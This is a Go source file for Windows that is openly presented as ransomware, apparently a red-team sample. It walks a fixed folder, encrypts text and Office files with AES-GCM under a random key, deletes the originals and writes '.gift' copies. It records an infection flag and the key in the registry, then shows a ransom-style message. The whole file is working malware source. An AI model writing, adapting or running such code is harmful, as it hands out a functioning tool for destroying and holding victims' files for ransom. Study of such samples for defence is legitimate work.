package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
	"tawesoft.co.uk/go/dialog"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890#$%&*()=-[]{}|?/.;")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func main() {
	rand.Seed(time.Now().UnixNano())

	aesKey := randSeq(32)

	victimDirectory := "C:\\ftp\\"
	var files []string
	err := filepath.Walk(victimDirectory,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && filepath.Ext(path) == ".txt" || filepath.Ext(path) == ".csv" || filepath.Ext(path) == ".docx" || filepath.Ext(path) == ".pptx" {
				files = append(files, path)
			}

			return nil
		})
	if err != nil {
		fmt.Println(err)
	}
	key := []byte(aesKey)

	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
	check, keyType, err := k.GetStringValue("Encrypted")

	if check == "1" {
		dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
		os.Exit(1)
	}
	k.SetStringValue("Encrypted", "1")
	k.SetStringValue("KeyBackup", aesKey)

	print(keyType)

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	nonce := make([]byte, gcm.NonceSize())

	for _, file := range files {
		rawString, err := os.ReadFile(file)
		text := []byte(rawString)
		text = gcm.Seal(nonce, nonce, text, nil)
		os.Remove(file)
		f, err := os.Create((file + ".gift"))
		f.Write(text)
		f.Close()
		if err != nil {
			println("f", err)
		}
	}
	dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
}
